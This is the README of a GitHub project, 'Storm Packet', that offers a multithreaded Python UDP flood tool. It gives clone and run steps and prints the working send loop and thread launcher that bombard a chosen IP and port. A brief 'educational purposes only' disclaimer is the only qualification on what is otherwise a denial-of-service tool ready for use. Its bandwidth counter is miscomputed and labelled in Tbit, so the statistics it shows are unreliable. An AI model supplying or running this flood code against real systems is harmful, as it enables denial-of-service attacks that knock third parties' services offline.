# Storm Packet

This project simulates a UDP flood attack to test the resilience of a network or server. It sends a high volume of UDP packets to a specified target IP and port using multithreading.

## Features

- Simulates a UDP flood attack for network testing.
- Multithreaded implementation for increased packet-sending speed.
- Configurable target IP, port, and packet size.
- Real-time tracking of total bandwidth sent.
- Color-coded console output for better visibility.

## Usage

### Prerequisites

- Python 3.6 or higher

### Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/dsametkaplan/storm-packet.git
   ```
2. Navigate to the project directory:
   ```bash
   cd storm-packet
   ```

### Running the Simulation

1. Run the script:
   ```bash
   python stormPacket.py
   ```
2. Provide the following inputs when prompted:

   - **Target IP address**: The IP address of the target server.
   - **Target port number**: The port on which the UDP packets will be sent.

3. The script will simulate the UDP flood and display real-time statistics, including the total bandwidth sent.

## Code Explanation

### Main Components

#### Colors Class

This class is used to add color-coded output to the console for better readability.

```python
class Colors:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    RESET = "\033[0m"
```

#### UDP Packet Sending Function

This function creates a UDP socket and continuously sends random packets to the target.

```python
def send_udp_packet():
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data_to_send = random._urandom(packet_size)
    while True:
        udp_socket.sendto(data_to_send, (target_ip, target_port))
        print(f"{Colors.GREEN}Packet sent: {target_ip}:{target_port}{Colors.RESET}", end='\r')
```

#### Flood Simulation Function

This function manages the creation and execution of threads for the UDP flood and tracks the total bandwidth sent.

```python
def flood_simulation(num_threads):
    threads = []
    total_sent = 0
    for _ in range(num_threads):
        thread = threading.Thread(target=send_udp_packet)
        threads.append(thread)
        thread.start()

    while total_sent < target_bandwidth:
        time.sleep(1)
        total_sent += num_threads * packet_size * 8 / 1e9
        print(f"{Colors.YELLOW}Total Sent: {total_sent:.2f} Tbit{Colors.RESET}", end='\r')

    for thread in threads:
        thread.join()
```

## Example Output

```plaintext
[93mEnter the target IP address: [0m192.168.1.1
[93mEnter the target port number: [0m8080
[91mStarting Storm Packet with 100 threads...[0m
[92mPacket sent: 192.168.1.1:8080[0m
[93mTotal Sent: 1.20 Tbit[0m
```

## Warning

This script is intended **only for educational purposes** and **authorized network testing**. Unauthorized use of this script on systems you do not own or have explicit permission to test is illegal and unethical.


## Contributions

Contributions are welcome! Feel free to fork the repository and submit a pull request.
